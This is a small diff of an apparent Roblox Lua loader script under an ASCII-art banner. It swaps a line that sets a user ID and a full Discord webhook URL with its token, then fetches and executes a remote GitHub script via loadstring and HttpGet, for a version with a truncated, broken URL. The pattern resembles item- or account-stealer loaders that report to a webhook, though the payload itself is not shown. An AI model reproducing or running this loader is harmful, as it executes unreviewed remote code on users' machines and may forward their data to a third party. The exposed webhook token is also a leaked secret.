@@ -5,4 +5,4 @@
  |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
  |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
          \/          \/         \/    \/                \/     \/     \/                   
-_G.UserID=226297822;_G.Webhook="https://discord.com/api/webhooks/1089642305494982666/MMs1JfdNrhgT6yiD22vF5CldDip8S-UmG98JZAG74UWPyrwolDZS7gMK2OkCZNZo0vPc";loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/Script.lua"))();
+_G.UserID=226297822;_G.Webhook="https://discord.com/api/webhooks/1089642305494982666/MMs1JfdNrhgT6yiD22vF5CldDip8S-UmG98JZAG74UWPyrwolDZS7gMK2OkCZNZo0vPc";loadstring(game:HttpGet("https://raw.githubusercontent."))();
